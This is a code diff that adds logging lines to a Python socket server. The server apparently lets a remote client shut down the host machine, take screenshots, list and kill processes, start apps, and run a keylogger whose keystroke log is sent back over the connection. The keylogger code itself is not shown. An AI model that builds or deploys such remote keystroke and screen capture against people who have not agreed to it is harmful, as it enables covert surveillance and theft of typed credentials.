@@ -63,52 +63,68 @@ class Server:
 
         # Shutdown
         if data == CMD_SHUTDOWN.encode():
+          print(f'[SHUTDOWN] {addr} requested shutdown.')
           self.shutdown(conn, addr)
 
         # Take screenshot
         elif data == CMD_TAKE_SCREENSHOT.encode():
+          print(f'[SCREENSHOT] {addr} requested screenshot.')
           self.take_screenshot()
           self.send_file(os.path.join(TMP_PATH, 'screenshot.png'), conn)
+          print(f'[SCREENSHOT] {addr} sent screenshot.')
 
         # View processes
         elif data == CMD_VIEW_PROCESSES.encode():
+          print(f'[PROCESSES] {addr} requested processes.')
           processes = self.get_all_processes()
           conn.send(processes.encode())
           time.sleep(0.01)
           conn.send(FLAG_PROCESSES_END.encode())
+          print(f'[PROCESSES] {addr} sent processes.')          
 
         # Kill process
         elif data == CMD_KILL_PROCESS.encode():
+          print(f'[KILL] {addr} requested kill process.')
           pid = conn.recv(BUFFER_SIZE).decode()
           self.kill_process(pid)
+          print(f'[KILL] {addr} killed process.')
 
         # Start keylogger
         elif data == CMD_START_KEYLOGGER.encode():
+          print(f'[KEYLOGGER] {addr} requested start keylogger.')
           print('Starting keylogger')
           self.start_keylogger()
+          print('Keylogger started')
 
         # Stop keylogger
         elif data == CMD_STOP_KEYLOGGER.encode():
+          print(f'[KEYLOGGER] {addr} requested stop keylogger.')
           print('Stopping keylogger')
           self.stop_keylogger()
+          print('Keylogger stopped')
         
         # Print keylogger
         elif data == CMD_PRINT_KEYLOGGER.encode():
+          print(f'[KEYLOGGER] {addr} requested print keylogger.')
           print('Printing keylogger')
           self.send_file(os.path.join(TMP_PATH, 'keylog.txt'), conn)
+          print('Keylogger printed')
 
         # View apps
         elif data == CMD_VIEW_APPS.encode():
+          print(f'[APPS] {addr} requested view apps.')
           apps = self.get_all_apps()
           conn.send(apps.encode())
           time.sleep(0.01)
           conn.send(FLAG_APPS_END.encode())
+          print(f'[APPS] {addr} sent apps.')
 
         # Start app
         elif data == CMD_START_APP.encode():
-          print('Starting app')
+          print(f'[APP] {addr} requested start app.')
           app_name = conn.recv(BUFFER_SIZE).decode()
           self.start_app(str(app_name))
+          print(f'[APP] {addr} started app.')
 
       conn.close()
       print(f"[DISCONNECTED] {addr} disconnected.")
@@ -117,8 +133,6 @@ class Server:
       conn.close()
       
   def shutdown(self, conn, addr):
-    print(f"[SHUTDOWN] {addr} disconnected.")
-    print(f'Received shutdown command. Server is shutting down.')
     conn.close()
     os.system('shutdown -s -t 0')
     
